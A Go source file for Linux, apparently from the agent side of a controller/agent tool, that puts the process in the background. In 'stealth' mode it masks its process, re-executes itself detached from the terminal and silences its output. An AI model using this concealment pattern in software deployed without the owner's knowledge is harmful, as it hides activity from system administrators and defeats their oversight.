//go:build !controller && linux
// +build !controller,linux

package main

import (
	"log"
	"os"
	"os/exec"
	"syscall"

	"golang.org/x/sys/unix"
)

func daemonize(runFunc func()) {
	// If not stealth mode, run as normal foreground process
	if !IsStealth {
		runFunc()
		return
	}

	// 1. Process Masking (Conditional)
	maskProcess()

	// 2. Daemonization (Fork and Exit Parent)
	if os.Getenv("AGENT_FORKED") != "1" {
		// Prepare environment
		env := append(os.Environ(), "AGENT_FORKED=1")

		// Prepare command with /proc/self/exe to re-execute self
		cmd := exec.Command("/proc/self/exe", os.Args[1:]...)
		cmd.Env = env
		cmd.Stdout = nil
		cmd.Stderr = nil
		cmd.Stdin = nil
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Setsid: true, // Create new session (detach from terminal)
		}

		if err := cmd.Start(); err != nil {
			log.Printf("Daemonize failed: %v", err)
			// Fallback: continue running in foreground
		} else {
			// Parent exits, child continues in background
			os.Exit(0)
		}
	}

	// 3. Child Process (Daemon) continues here
	// Redirect stdout/stderr to /dev/null to be safe
	devNull, err := os.OpenFile("/dev/null", os.O_WRONLY, 0644)
	if err == nil {
		unix.Dup2(int(devNull.Fd()), int(os.Stdout.Fd()))
		unix.Dup2(int(devNull.Fd()), int(os.Stderr.Fd()))
		devNull.Close()
	}
	
	runFunc()
}
